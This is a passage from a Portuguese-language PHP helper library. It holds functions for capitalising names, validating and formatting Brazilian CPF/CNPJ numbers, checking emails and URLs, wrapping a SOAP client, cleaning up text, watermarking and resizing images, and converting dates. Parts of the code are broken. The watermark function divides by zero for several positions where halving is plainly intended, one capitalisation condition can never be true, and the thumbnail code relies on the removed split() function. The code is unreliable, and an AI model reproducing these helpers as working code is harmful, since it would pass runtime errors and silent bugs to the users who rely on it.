				if((strlen($valor) == 1) && ($valor[0] != "e") && (ord($valor[0]) < 0) && (ord($valor[0]) > 9)){ $valor .= "."; }
				// se a primeira letra for minuscula acentuada transforma em maiscula acentuada
				if((ord($valor[0]) >= 224) && (ord($valor[0] <= 255))){	$valor[0] = chr(ord($valor[0]) - 32); }
			}
		}//foreach
		$nome = implode(" ", $nome);
		if($utf8 == "1"){ $nome = utf8_encode($nome); }
	}
	$nome = str_replace("Rm","RM",$nome);
	$nome = str_replace("Re","RE",$nome);
	return $nome;//*/	

	/*
	* Exceções em letras minúsculas são palavras que você não deseja converter
   	* Exceções todas em maiúsculas são quaisquer palavras que você não deseja converter em maiúsculas e minúsculas
  	* mas deve ser convertido em maiúsculas, por exemplo:
   	* rei Henrique viii ou rei Henrique Viii deveria ser o rei Henrique VIII
	*/
	 $delimiters = array(" ", "-", ".", "/", "'", "O'", "Mc");
	 $exceptions = array("de", "da", "dos", "das", "do", "a", "à", "e", "é", "ou", "RE", "RM", "RD", "CPF", 'CPF/CNPJ', "CNPJ", "CNPJ/CPF", "C.P.F.", "C.N.P.J.", "ABNT", "ANATEL", "CEP", "FGTS", "INPI", "IPTU", "ITU", "IPVA", "DETRAN", "IML", "ONG", "RG", "PIS", "AC", "AL", "AM", "AP", "BA", "CE", "DF", "ES", "GO", "MA", "MG", "MS", "MT", "PA", "PB", "PE", "PI", "PR", "RJ", "RN", "RO", "RR", "RS", "SC", "SE", "SP", "TO", "III", "IV", "V", "VI", "ART", "RRT", "ART/RRT");
	$string = trim($string);
	$string = str_replace("  "," ",$string);
	$string = str_replace("  "," ",$string);
	$string = str_replace("  "," ",$string);
	$string = mb_convert_case($string, MB_CASE_TITLE, "UTF-8");
	foreach ($delimiters as $dlnr => $delimiter) {
		$words = explode($delimiter, $string);
		$newwords = array();
		foreach ($words as $wordnr => $word) {
			if (in_array(mb_strtoupper($word, "UTF-8"), $exceptions)) {
				// check exceptions list for any words that should be in upper case
				$word = mb_strtoupper($word, "UTF-8");
			} elseif (in_array(mb_strtolower($word, "UTF-8"), $exceptions)) {
				// check exceptions list for any words that should be in upper case
				$word = mb_strtolower($word, "UTF-8");
			} elseif (!in_array($word, $exceptions)) {
				// convert to uppercase (non-utf8 only)
				$word = ucfirst($word);
			}
			array_push($newwords, $word);
		}
		$string = join($delimiter, $newwords);
	}//foreach
	return $string;
}//fim funcao sentenca($nome){



//função de validação de CPF e CNPJ
//exemplode uso: if(cpfj($doc) == "1")
function cpfj($candidato) {
    $l = strlen($candidato = str_replace(array(".","-","/"),"",$candidato));
    if ((!is_numeric($candidato)) || (!in_array($l,array(11,14))) || (count(count_chars($candidato,1))==1)) {
        return false;
    }
    $cpfj = str_split(substr($candidato,0,$l-2));
    $k = 9;
    for ($j=0;$j<2;$j++) {
        for ($i=(count($cpfj));$i>0;$i--) {
            $s += $cpfj[$i-1] * $k;
            $k--;
            $l==14&&$k<2?$k=9:1;
        }
        $cpfj[] = $s%11==10?0:$s%11;
        $s = 0;
        $k = 9;
    }    
    return $candidato==join($cpfj);
}//fim função de validação de CPF e CNPJ
function limpa_cpfj($numero) {
    $l = strlen($numero = str_replace(array(".","-","/"),"",$numero));
    return $l;
}//fim função limpacpf



/**
 * Formata CPF ou CNPJ
 *
 * @access public
 * @return string  CPF ou CNPJ formatado
*/
function formataCpfj($numero) {
	$numero = str_replace(" ","",$numero);
	$numero = str_replace(".","",$numero);
	$numero = str_replace("-","",$numero);
	$numero = str_replace("/","",$numero);
	if(strlen($numero) >= "11"){
		// Valida CPF
		if(strlen($numero) == "11"){
			// Formata o CPF ###.###.###-##
			$formatado  = substr($numero, 0, 3).'.';
			$formatado .= substr($numero, 3, 3).'.';
			$formatado .= substr($numero, 6, 3).'-';
			$formatado .= substr($numero, 9, 2);
		}else{
			// Formata o CNPJ ##.###.###/####-##
			$formatado  = substr($numero,  0,  2).'.';
			$formatado .= substr($numero,  2,  3).'.';
			$formatado .= substr($numero,  5,  3).'/';
			$formatado .= substr($numero,  8,  4).'-';
			$formatado .= substr($numero, 12, 14);
		} 
	}else{ $formatado  = $numero; }//if(strlen($str) >= "11"){
 	// Retorna o valor 
	return $formatado;
}//fim função formataCpfj




//Função verifica que o email é válido
/*
Exemplo de USO:
echo verifica_email($email); //retorna 1 se for válido
*/
function verifica_email($EMail){
	$valida_email = "0";
	if(filter_var($EMail, FILTER_VALIDATE_EMAIL)){
	 	$valida_email = "1";
	}
	if($valida_email == "1"){
		list($User, $Domain) = explode("@", $EMail);
		if (function_exists('checkdnsrr')) {
			$Result = checkdnsrr($Domain, 'MX');
		} else {
			$Result = "1";//
		}

		//$Result = checkdnsrr($Domain, 'MX');
		$valida_email = $Result;
	}
	if($valida_email != "1"){ $valida_email = "0"; }
 	return $valida_email;
}//fim função verifica_email($EMail)



/*Função destinada a verificacao de URL externas*/
function urlExists($url,$vars="302,200,401,500"){
	$validar = @get_headers($url);
	$validar = explode(" ",$validar[0]);
	if(preg_match("/,".$validar[1].",/",",".$vars.",")){ return true; }else{ return false; }
}//urlExists




//############################################################################  DADOS DE CONEXAO SOAP ||||||||
function conexaoSOAP($url,$wsdl=NULL){
	$RET_CLIENTE = NULL;
	//verifica se existe conexao com servidor
	if(urlExists($url) == "1"){
		//faz a instancia ao webserver 
		$RET_CLIENTE = new SoapClient($wsdl, array(
			'location' => $url,
			'uri' => $url,
			'encoding'=>'ISO-8859-1',
			'trace' => 1,
			'exceptions' => 0));
	}// if urlExists
	return $RET_CLIENTE;
}//conexaoSOAP
//############################################################################  DADOS DE CONEXAO SOAP ||||||||



/* &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&& funcoes para texto ------------- >>>>
Funcoes com a funcao de correcao de texto e palavras para textos em descontrole de contes
*/
//Esta Função transforma o texto em minúsculo respeitando a acentuação
function str_minuscula($texto) { 
    $texto = strtr(strtolower($texto),"ÀÁÂÃÄÅÆÇÈÉÊËÌÍÎÏÐÑÒÓÔÕÖ×ØÙÜÚÞßÇ","àáâãäåæçèéêëìíîïðñòóôõö÷øùüúþÿç"); 
    return $texto; 
} 

//Esta Função transforma o texto em maiúsculo respeitando a acentuação
function str_maiuscula($texto) { 
    $texto = strtr(strtoupper($texto),"àáâãäåæçèéêëìíîïðñòóôõö÷øùüúþÿç","ÀÁÂÃÄÅÆÇÈÉÊËÌÍÎÏÐÑÒÓÔÕÖ×ØÙÜÚÞßÇ"); 
    return $texto; 
} 

//Esta Função transforma a primeira letra do texto em maiúsculo respeitando a acentuação
function primaira_maiuscula($texto) { 
    $texto = strtr(ucfirst($texto),"ÀÁÂÃÄÅÆÇÈÉÊËÌÍÎÏÐÑÒÓÔÕÖ×ØÙÜÚÞßÇ","àáâãäåæçèéêëìíîïðñòóôõö÷øùüúþÿç"); 
    return $texto; 
} 

//Verifica se a palavra está toda em maiúscula
function comparaPalavraMaiuscula($palavra){
	
$palavra=str_replace(" ","",$palavra);

if ($palavra=="") return false;
if ($palavra=="[:p:]")  return false;
if (strlen($palavra)<=1) return false;

$palavra=preg_replace("/[^a-zA-Z0-9]/i", "", strtr($palavra, "áàãâéêíóôõúüçÁÀÃÂÉÊÍÓÔÕÚÜÇ ", "aaaaeeiooouucAAAAEEIOOOUUC_"));

if ($palavra == str_maiuscula($palavra))
	return true;

	return false;
}

function seguirsentenca($texto){
	
	//Variáveis
	$pontuacoes=array(",",".","!","?",";");
	
	$array_abreviado=array("vc","tb","jesus","naum","ñ","pq");
	$array_abr_certo=array("você","também","Jesus","não","não","porque");

	//Prepara paragrafo
	$texto=str_replace("
","[:p:]",$texto);

	//acerta maiúscula e minúscula e inicia as sentenças com a primeira letra maiúscula
	$array=explode(" ",$texto);
	$novo_texto="";
	$tam_array=count($array);

	for ($i=0;$i<$tam_array;$i++){
		$palavra=$array[$i];	

		if(comparaPalavraMaiuscula($palavra)) 
			$nova_palavra=str_minuscula($palavra);
		else
			$nova_palavra=$palavra;
	
		$caracter_anterior=substr($array[$i-1],-1);
		$caracter_anterior_paragrafo=substr($array[$i-1],-5);

		if ($caracter_anterior=="." || $caracter_anterior=="!" || $caracter_anterior=="?" || $caracter_anterior_paragrafo=="[:p:]" || $i==0)
			$nova_palavra=primaira_maiuscula($nova_palavra);
	
		$novo_texto.=$nova_palavra." ";
	}

	$texto=$novo_texto;

	//Adicionar espaçoes depois das pontuações e remover antes
	for ($i=0;$i<count($pontuacoes);$i++){
		$ponto=$pontuacoes[$i];
		$texto=str_replace(" ".$ponto." ",$ponto." ",$texto);
		$texto=str_replace(" ".$ponto,$ponto." ",$texto);
		$texto=str_replace($ponto,$ponto." ",$texto);
	}

	//acerta parênteses
	$texto=str_replace(" ( "," (",$texto);
	$texto=str_replace("( "," (",$texto);
	$texto=str_replace("("," (",$texto);
	$texto=str_replace(" ) ",") ",$texto);
	$texto=str_replace(" )",") ",$texto);
	$texto=str_replace(")",") ",$texto);

	//acerta redicencias
	$texto=str_replace(". . .","...",$texto);

	//remove mais de uma ! e ?
	$texto=str_replace("! ! ! ","!",$texto);
	$texto=str_replace("! ! ","!",$texto);
	$texto=str_replace("!!","!",$texto);
	$texto=str_replace("? ? ? ","?",$texto);
	$texto=str_replace("? ? ","?",$texto);
	$texto=str_replace("??","?",$texto);

	//remover espaçoes em branco extras
	$texto=str_replace("   "," ",$texto);
	$texto=str_replace("  "," ",$texto);
	$texto=str_replace("  "," ",$texto);

	//Adicionar paragrafo
	//$texto=str_replace("n","",$texto);
	//$texto=str_replace("r","",$texto);

	for ($i=0;$i<=10;$i++)
		$texto=str_replace("[:p:][:p:]","[:p:]",$texto);

	$array=explode("[:p:]",$texto);
	$novo_texto="";
	$tam_array=count($array);
	for ($i=0;$i<$tam_array;$i++){
		$paragrafo=$array[$i];	
	
		$paragrafo=trim($paragrafo);
		$paragrafo=trim($paragrafo,",");
		$paragrafo=primaira_maiuscula($paragrafo);
	
		if ($paragrafo=="") break;

		$ultimo_caracter=substr($paragrafo,-1);

		if ($ultimo_caracter!='.' && $ultimo_caracter!='!' && $ultimo_caracter!='?' && $ultimo_caracter!=':' && $ultimo_caracter!=';')
			$paragrafo.=".";

		if ($i!=$tam_array)
			$novo_texto.=$paragrafo."

";

	}

	$texto=$novo_texto;
	//Expandir palavras abreviadas
	$texto=str_replace($array_abreviado,$array_abr_certo,$texto);
	return $texto;
}
/* &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&& funcoes para texto ------------- >>>> */



//+++++++++++++++++++++ inicio +++++++++++++++++ funcoes de tratamento de imagens
//iNSERIR MARCADAGUA E REDIMENSIONAR ARQUIVO DE IMAGEM
 /** 
    * Função principal 
    * 
    * É possível escolher a posição da marca d'água, basta dizer o número 
    * da posição desejada no parâmetro $pos. Os valores possíveis, são: 
    * 0 = Centro 
    * 1 = Topo Esquerdo 
    * 2 = Topo Direito 
    * 3 = Rodapé Direito 
    * 4 = Rodapé Esquerdo 
    * 5 = Topo Centralizado 
    * 6 = Centro direito 
    * 7 = Rodapé Centralizado 
    * 8 = Centro Esquerdo 
    * 
    * Nos parâmetros de imagem fonte, marca dagua e imagem destino, você pode 
    * usar ou imagens PNG ou JPEG ou ambos os tipos, exemplos: 
    * marca_dagua("foto.png", "agua.jpg", "foto.png", 1, 50); 
    * marca_dagua("foto.jpg", "agua.jpg", "foto.jpg", 1, 50); 
    * marca_dagua("foto.jpg", "agua.png", "foto.jpg", 1, 50); 
    * marca_dagua("foto.jpg", "agua.png", "foto.png", 1, 50); 
    * marca_dagua("foto.png", "agua.png", "foto.png", 1, 50); 
    * 
    * @param string $imagemfonte O caminho da imagem em que a marca da água será adicionada, ex: "imagens/foto.jpg" 
    * @param string $marcadagua O caminho da imagem marca d'água, ex: "imagens/marca.jpg" 
    * @param string $imagemdestino O nome da nova imagem, ex: "imagens/nova.png" 
    * @param integer $pos A posição da marca da água (veja acima) 
    * @param integer $transicao (0 a 100) Transparência da Marca d'Água - Menor número > Transparência 
    * @author Alfred R. Baudisch<alfred@auriumsoft.com.br> 
    * @since Mai 18, 2004 
    * @version 2.0 Jul 26, 2004 
    * @access public 
    */ 
    function marca_dagua($imagemfonte, $marcadagua, $imagemdestino, $pos = 0, $transicao = 100) 
    {  
    /** 
    * Verifica o tipo da imagem e retorna a função para uso 
    * 
    * @param string $nome Caminho da imagem a se verificar 
    * @param string $acao Ação a se retornar a função: abrir ou salvar 
    */ 
    function verifica_tipo($nome, $acao) 
    { 
        if(preg_match("/^(.*)\.(jpeg|jpg)$/i", $nome)) 
        { 
            if($acao == "abrir") 
            { 
                return "imageCreateFromJPEG"; 
            } 
            else 
            { 
                return "imagejpeg"; 
            } 
        } 
        elseif(preg_match("/^(.*)\.(png)$/i", $nome)) 
        { 
            if($acao == "abrir") 
            { 
                return "imageCreateFromPNG"; 
            }else{ 
                return "imagepng"; 
            } 
        }else{ 
            echo "Formato de Imagem Inválido!<br>A imagem deve ser PNG ou JPEG!"; 
            die; 
        } 
    } 

        /** 
        * Obtém o handle de ambas as imagens 
        */ 
        $funcao = verifica_tipo($marcadagua, "abrir"); 
        $marcadagua_id  = $funcao($marcadagua); 
        $funcao = verifica_tipo($imagemfonte, "abrir"); 
        $imagemfonte_id = $funcao($imagemfonte); 

        // Obtém os tamanhos de ambas as imagens 
        $imagemfonte_data  = getimagesize($imagemfonte); 
        $marcadagua_data   = getimagesize($marcadagua);  
        $imagemfonte_largura = $imagemfonte_data[0]; 
        $imagemfonte_altura  = $imagemfonte_data[1]; 
        $marcadagua_largura  = $marcadagua_data[0]; 
        $marcadagua_altura   = $marcadagua_data[1]; 

        // Centralizado 
        if( $pos == 0 )  
        {  
           $dest_x = ( $imagemfonte_largura / 2 ) - ( $marcadagua_largura / 2 );  
           $dest_y = ( $imagemfonte_altura / 2 ) - ( $marcadagua_altura / 2 );  
        }  

        // Topo Esquerdo 
        if( $pos == 1 )  
        {  
           $dest_x = 0;  
           $dest_y = 0;  
        }  

        // Topo Direito 
        if( $pos == 2 )  
        {  
           $dest_x = $imagemfonte_largura - $marcadagua_largura;  
           $dest_y = 0;  
        }  

        // Rodapé Direito 
        if( $pos == 3 )  
        {  
           $dest_x = ($imagemfonte_largura - $marcadagua_largura) - 0;  
           $dest_y = ($imagemfonte_altura - $marcadagua_altura) - 0;  
        }  

        // Rodapé Esquerdo 
        if( $pos == 4 )  
        {  
           $dest_x = 0;  
           $dest_y = $imagemfonte_altura - $marcadagua_altura;  
        }  

        // Topo Centralizado 
        if( $pos == 5 )  
        {  
           $dest_x = ( ( $imagemfonte_largura - $marcadagua_largura ) / 0 );  
           $dest_y = 0;  
        }  

        // Centro Direito 
        if( $pos == 6 )  
        {  
           $dest_x = $imagemfonte_largura - $marcadagua_largura;  
           $dest_y = ( $imagemfonte_altura / 0 ) - ( $marcadagua_altura / 0 );  
        }  
            
        // Rodapé Centralizado 
        if( $pos == 7 )  
        {  
           $dest_x = ( ( $imagemfonte_largura - $marcadagua_largura ) / 0 );  
           $dest_y = $imagemfonte_altura - $marcadagua_altura;  
        }  

        // Centro Esquerdo 
        if( $pos == 8 )  
        {  
           $dest_x = 0;  
           $dest_y = ( $imagemfonte_altura / 0 ) - ( $marcadagua_altura / 0 );  
        }  

        // A função principal: misturar as duas imagens 
        imageCopyMerge($imagemfonte_id, $marcadagua_id, $dest_x, $dest_y, 0, 0, $marcadagua_largura, $marcadagua_altura, $transicao);  

        // Cria a imagem com a marca da agua 
        $funcao = verifica_tipo($imagemdestino, "salvar"); 
        $funcao($imagemfonte_id, $imagemdestino, 100);
		imagedestroy($imagemfonte_id);
    } 
//fim da função marca dagua



//função que cria a imagem menor thumb
function criar_thumbnail($origem,$destino='./',$largura='640',$pre='',$formato='JPEG') {  
	//perara vars para imagem##################### ----
	//extensao imagem
	if($formato == ""){
		$formato = strrchr($origem, ".");
		$formato = str_replace(".", "", $formato);
	}//fim if($formato == ""){
	//*
    switch($formato)  
    {  
        case 'JPG':  
            $tn_formato = 'jpg';  
            break;  
        case 'JPEG':  
            $tn_formato = 'jpg';  
            break;  
        case 'PNG':  
            $tn_formato = 'png';  
            break;  
        case 'GIF':  
            $tn_formato = 'png';  
            break;
        case 'jpg':  
            $tn_formato = 'jpg';  
            break;  
        case 'jpeg':  
            $tn_formato = 'jpg';  
            break;  
        case 'png':  
            $tn_formato = 'png';  
            break;  
        case 'gif':  
            $tn_formato = 'png';  
            break;   
    }  
    $ext = split("[/\\.]",strtolower($origem));  
    $n = count($ext)-1;  
    $ext = $ext[$n];  

    $arr = split("[/\\]",$origem);  
    $n = count($arr)-1;  
    $arra = explode('.',$arr[$n]);  
    $n2 = count($arra)-1;  
    $tn_name = str_replace('.'.$arra[$n2],'',$arr[$n]);  
    $destino = $destino.$pre.$tn_name.'.'.$tn_formato;  

    if ($ext == 'jpg' || $ext == 'jpeg'){  
        $im = imagecreatefromjpeg($origem);  
    }elseif($ext == 'png'){  
        $im = imagecreatefrompng($origem);  
    }elseif($ext == 'gif'){  
         $im = imagecreatefromgif($origem);  
    }  
    $w = imagesx($im);  
    $h = imagesy($im);  
    if ($w > $h)  
    {  
        $nw = $largura;  
        $nh = ($h * $largura)/$w;  
    }else{  
        $nh = $largura;  
        $nw = ($w * $largura)/$h;  
    }  
    if(function_exists('imagecopyresampled'))  
    {  
        if(function_exists('imageCreateTrueColor'))  
        {  
            $ni = imageCreateTrueColor($nw,$nh);  
        }else{  
            $ni    = imagecreate($nw,$nh);  
        }  
        if(!@imagecopyresampled($ni,$im,0,0,0,0,$nw,$nh,$w,$h))  
        {  
            imagecopyresized($ni,$im,0,0,0,0,$nw,$nh,$w,$h);  
        }  
    }else{  
        $ni    = imagecreate($nw,$nh);  
        imagecopyresized($ni,$im,0,0,0,0,$nw,$nh,$w,$h);  
    }  

    if($tn_formato=='jpg'){  
        imagejpeg($ni,$destino,85);  
    }elseif($tn_formato=='png'){  
        imagepng($ni,$destino);  
    }elseif($tn_formato=='gif'){  
        imagegif($ni,$destino);  
    }
  	imagedestroy($ni);
	
	// */
  
}//fim da funcao cria  imagem menor thumb


// exemplo 
/*
criar_thumbnail('foto.jpg');
marca_dagua("foto.jpg", "logo.png", "foto.jpg", 2, 90); 

//função que cria a imagem menor
criar_thumbnail("$origem", "$destino", "640", "", "JPEG"); 
*/
//+++++++++++++++++++++ fim +++++++++++++++++ funcoes de tratamento de imagens








//função que cria a imagem menor 
function imagemMenor($n_imagem,$destino='./',$wid,$hei="") {
//solicitação de imagem full - tamanho real
	if(($wid == "full") or ($hei == "full")){
		$tamFULL = getimagesize("$n_imagem");
		$wid = (int)$tamFULL[0];
		$hei = (int)$tamFULL[1];
	}else{
		$wid = (int)$wid;
		$hei = (int)$hei;
	}//fim imagem full*/

	//perara vars para imagem##################### ----
	//tipo imagem
	if(exif_imagetype($n_imagem) == IMAGETYPE_GIF){ $extensao = "gif"; }
	if(exif_imagetype($n_imagem) == IMAGETYPE_JPEG){ $extensao = "jpg"; }
	if(exif_imagetype($n_imagem) == IMAGETYPE_PNG){ $extensao = "png"; }
	//echo $n_imagem."-".$extensao; exit(0);

	//verifica extensao
	if(($extensao == "jpg") or ($extensao == "jpeg")){
		$im       = imagecreatefromjpeg($n_imagem); // Cria uma nova imagem a partir de um arquivo ou URL
	}//fim if(($extensao == "jpg") or ($extensao == "jpeg")){
	if($extensao == "png"){
		$im       = imagecreatefrompng($n_imagem); // Cria uma nova imagem a partir de um arquivo ou URL
	}//fim f($extensao == "png"){
	if($extensao == "gif"){
		$im       = imagecreatefromgif($n_imagem); // Cria uma nova imagem a partir de um arquivo ou URL
	}//fim f($extensao == "gif"){


//prepara a imagem++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++|||
  $w = imagesx($im);
  $h = imagesy($im);
  
  //monta a proporção
  if($w >= $wid){
	 $hei =  ($h*$wid)/$w;//pega proporção
  }
  if($h >= $hei){
	 $wid =  ($w*$hei)/$h;//pega proporção
  }  
	
  $w1 = $w / $wid;
  if ($hei == 0){
    $h1 = $w1;
	$hei = $h / $w1;
  }else{
    $h1 = $h / $hei;
  }
	$min = min($w1,$h1);  
	   
      $xt = $min * $wid;
	  $x1 = ($w - $xt) / 2;
	  $x2 = $w - $x1;	  

      $yt = $min * $hei;
	  $y1 = ($h - $yt) / 2;
	  $y2 = $h - $y1;	  
	  
	$x1 = (int) $x1;
	$x2 = (int) $x2;
	$y1 = (int) $y1;
	$y2 = (int) $y2;				
	
    $img = NULL;
	
    $img = imagecreatetruecolor($wid, $hei); 
    //$background = imagecolorallocate($img, 50, 50, 50);
    imagecolorallocate($img,255,255,255); 
    $c  = imagecolorallocate($img,255,255,255); 
    $c1 = imagecolorallocate($img,0,0,0);      
	for ($i=0;$i<=$hei;$i++){
	  imageline($img,0,$i,$wid,$i,$c);
	}      
	imagecopyresampled($img,$im,0,0,$x1,$y1,$wid,$hei,$x2-$x1,$y2-$y1);	

//verifica extensao
	if(($extensao == "jpg") or ($extensao == "jpeg")){
		imagejpeg($img,$destino,85);
	}//fim if(($extensao == "jpg") or ($extensao == "jpeg")){
	if($extensao == "png"){
		imagepng($img,$destino);
	}//fim f($extensao == "png"){
	if($extensao == "gif"){
		imagegif($img,$destino);
	}//fim f($extensao == "gif"){
  	imagedestroy($img);
}//fim imagemMenor da funcao cria  imagem menor





//reduzir imagem com retornos do tipo:  base64, bin e html
function reduzirImagemParaBase64($caminhoImg,$forca_wid=500,$forca_hei=500,$proporcao="0",$tipo="base64"){
	//tipo imagem
	$extensao = "";
	if($extensao == ""){ if(exif_imagetype($caminhoImg) == IMAGETYPE_GIF){ $extensao = "gif"; }}
	if($extensao == ""){ if(exif_imagetype($caminhoImg) == IMAGETYPE_JPEG){ $extensao = "jpg"; }}
	if($extensao == ""){ if(exif_imagetype($caminhoImg) == IMAGETYPE_PNG){ $extensao = "png"; }}
	if($extensao == ""){ $extensao = "jpg"; }				
	//verifica extensao	
	if($extensao == "jpg"){ $image = imagecreatefromjpeg($caminhoImg); }
	if($extensao == "png"){ $image = imagecreatefrompng($caminhoImg); }
	if($extensao == "gif"){ $image = imagecreatefromgif($caminhoImg); }	
	#gerando a a miniatura da imagem
	$w = imagesx($image);
	$h = imagesy($image);
	//verifica se solicitou proporção
	if($proporcao >= "1"){
		//Novos valores
		$wid = 0;
		$hei = 0;		
		if($w > $h) {
			$ratio = ($proporcao / $w);
		}else{
			$ratio = ($proporcao / $h);
		}		
		$wid = ($w * $ratio);
		$hei = ($h * $ratio);
	}else{//if($proporcao >= "1"){
		$wid = $forca_wid; $hei = $forca_hei;
	}//else{//if($proporcao >= "1"){	
	//inicia montagem
	$w1 = $w / $wid;
	if ($hei == 0){ $h1 = $w1; $hei = $h / $w1; }else{ $h1 = $h / $hei; }
	$min = min($w1,$h1);  	   
	$xt = $min * $wid;
	$x1 = ($w - $xt) / 2;
	$x2 = $w - $x1;
	$yt = $min * $hei;
	$y1 = ($h - $yt) / 2;
	$y2 = $h - $y1;  
	$x1 = (int) $x1;
	$x2 = (int) $x2;
	$y1 = (int) $y1;
	$y2 = (int) $y2;	
	$img = NULL;	
	$img = imagecreatetruecolor($wid, $hei); 
	//$background = imagecolorallocate($img, 50, 50, 50);
	imagecolorallocate($img,255,255,255); 
	$c  = imagecolorallocate($img,255,255,255); 
	$c1 = imagecolorallocate($img,0,0,0);      
	for ($i=0;$i<=$hei;$i++){
	  imageline($img,0,$i,$wid,$i,$c);
	}      
	imagecopyresampled($img,$image,0,0,$x1,$y1,$wid,$hei,$x2-$x1,$y2-$y1);
	ob_start();
	//verifica extensao
	if($extensao == "jpg"){ imagejpeg($img, null, 100); }
	if($extensao == "png"){ imagepng($img, null, 100); }
	if($extensao == "gif"){ imagegif($img, null, 100); }		
	$imageBin = ob_get_clean();
	imagedestroy($img);
	$imgRet = base64_encode($imageBin);
	if($tipo == "bin"){ $imgRet = $imageBin; }
	if($tipo == "html"){ $imgRet = "data:image/".$extensao.";base64,".$imgRet; }
	return $imgRet;
}//reduzirImagemParaBase64






//função que monta o time, passando a data e hora
/*
Exemplo do uso:
1: - com data
$data1 = "04/03/2011 10:11";
$time_a = time_data_hora($data1); //converte data/hora em time UNIX "04/03/2011 10:11"
*/
function time_data_hora($data1){
	if(($data1 != "") and ($data1 != "00/00/0000 00:00") and ((strlen($data1) == "14") or (strlen($data1) == "15") or (strlen($data1) == "16") or (strlen($data1) == "17") or (strlen($data1) == "18") or (strlen($data1) == "19"))){
		$s = explode(" ", $data1);
		$d = explode("/", $s[0]);
		$h = explode(":", $s[1]);
		$dia1 = $d[0]; // Dia inicial da contagem regressiva
		$mes1 = $d[1]; // Mês inicial da contagem regressiva
		$ano1 = $d[2]; // Ano inicial da contagem regressiva
		$hora1 = $h[0]; // Hora inicial do evento (depende do fuso servidor - não recomendo o uso)
		$minuto1 = $h[1]; // Minuto inicial do evento (depende do fuso servidor - não recomendo o uso)
		$seg1 = 0; if(isset($h[2])){ $seg1 = $h[2]; }// Segundo inicial do evento (depende do fuso servidor - não recomendo o uso)
		$time1 = mktime($hora1,$minuto1,$seg1,$mes1,$dia1,$ano1);
	}else{
		$time1 = "0";	
	}
	return $time1;
}//fim funcao monta time








//função que monta datatime para mysql
/*
Exemplo do uso:
1: - com time unix
*/
function datatime_mysql($timeg){
	if($timeg == ""){ $converte='off'; $time1 = "0"; }
	if(preg_match("/-/", $timeg)){ $converte = "time"; }else{  $converte = "data"; }
	if($converte == "time"){
		$t = explode(" ", $timeg);
		$d = explode("-", $t[0]);
		$h = explode(":", $t[1]);
		$dia1 = $d[2]; // Dia inicial da contagem regressiva
		$mes1 = $d[1]; // Mês inicial da contagem regressiva
		$ano1 = $d[0]; // Ano inicial da contagem regressiva
		$hor = $h[0]; // horas
		$min = $h[1]; // minuto
		$seg = $h[2]; // segundos
		if(($dia1 == "0") or ($mes1 == "0") or ($ano1 == "0")){ $time1 = "0"; }else{
			$time1 = mktime($hor,$min,$seg,$mes1,$dia1,$ano1);
		}
	}
	if($converte == "data"){
		$dia1 = date("d",$timeg); // Dia inicial da contagem regressiva
		$mes1 = date("m",$timeg); // Mês inicial da contagem regressiva
		$ano1 = date("Y",$timeg); // Ano inicial da contagem regressiva
		$hor = date("H",$timeg); // horas
		$min = date("i",$timeg); // minuto
		$seg = date("s",$timeg); // segundos
		$time1 = $ano1."-".$mes1."-".$dia1." ".$hor.":".$min.":".$seg;	
	}
	return $time1;
}//fim funcao datatime_mysql







//função que monta data para mysql
/*
Exemplo do uso:
1: - com data
$data1 = "04/03/2011"; 2011-03-04
*/
function data_mysql($data1, $converte='auto'){
	if($data1 != ""){
		if($converte == "auto"){ if(preg_match("/-/", $data1)){ $converte = "0"; }else{  $converte = "1"; } }
		if($converte == "0"){
			$d = explode("-", $data1);
			$dia1 = $d[2]; // Dia inicial da contagem regressiva
			$mes1 = $d[1]; // Mês inicial da contagem regressiva
			$ano1 = $d[0]; // Ano inicial da contagem regressiva
			$data = $dia1."/".$mes1."/".$ano1;
		}else{
			$d = explode("/", $data1);
			$dia1 = $d[0]; // Dia inicial da contagem regressiva
			$mes1 = $d[1]; // Mês inicial da contagem regressiva
			$ano1 = $d[2]; // Ano inicial da contagem regressiva
			$data = $ano1."-".$mes1."-".$dia1;	
		}
	}else{ $data = ""; }//if($data1 != ""){
	return $data;
}//fim funcao monta data







//função que exibe data de 
/*
Exemplo do uso:
1: - com data
$data1 = "2016-05-18T00:00:00.000-03:00"; 18/05/2016
*/
function data_XMLGregorianCalendar($data1){
	if($data1 != ""){
		if(preg_match("/T/", $data1)){
			$t = explode("T", $data1);
			$d = explode("-", $t["0"]);
			$dia1 = $d[2]; // Dia inicial da contagem regressiva
			$mes1 = $d[1]; // Mês inicial da contagem regressiva
			$ano1 = $d[0]; // Ano inicial da contagem regressiva
			$data = $dia1."/".$mes1."/".$ano1;
		}else{ $data = ""; }//if(preg_match("/T/", $data1)){
	}else{ $data = ""; }//if($data1 != ""){
	return $data;
}//fim funcao monta data









//função que calcula contagem entre dias com dia,hora e minuto
/*
Exemplo do uso:
1: - com data
$data1 = "04/03/2011 10:11";
$data2 = "05/03/2011 11:20";
echo "Faltam ".contagem_datas($data1, $data2, '1', '1');

2: - com time
$data1 = time();
$data2 = time()+86450;
echo "Faltam ".contagem_datas($data1, $data2, '2', '1');
*/
function contagem_datas($data1, $data2, $time='1', $tipo='1'){
	if($time == "1"){
		$s = explode(" ", $data1);
		$d = explode("/", $s[0]);
		$h = explode(":", $s[1]);
		$dia1 = $d[0]; // Dia inicial da contagem regressiva
		$mes1 = $d[1]; // Mês inicial da contagem regressiva
		$ano1 = $d[2]; // Ano inicial da contagem regressiva
		$hora1 = $h[0]; // Hora inicial do evento (depende do fuso servidor - não recomendo o uso)
		$minuto1 = $h[1]; // Minuto inicial do evento (depende do fuso servidor - não recomendo o uso)
		
		$s = explode(" ", $data2);
		$d = explode("/", $s[0]);
		$h = explode(":", $s[1]);
		$dia2 = $d[0]; // Dia da contagem regressiva
		$mes2 = $d[1]; // Mês da contagem regressiva
		$ano2 = $d[2]; // Ano da contagem regressiva
		$hora2 = $h[0]; // Hora do evento (depende do fuso servidor - não recomendo o uso)
		$minuto2 = $h[1]; // Minuto do evento (depende do fuso servidor - não recomendo o uso)
		
		$time1 = mktime($hora1,$minuto1,0,$mes1,$dia1,$ano1);
		$time2 = mktime($hora2,$minuto2,0,$mes2,$dia2,$ano2);
	}else{ // else if($time == "1"){
		$time1 = $data1;
		$time2 = $data2;
	}//fim else if($time == "1"){
	
	//verifica se já venceu
	if($time1 >= $time2){
		$var_r = "0";
	}else{//else ja venceu
	$time_cont = $time2-$time1;
	$dias = "0"; $horas = "0"; $minutos = "0"; $segundos = "0";
	while($time_cont > "0"){
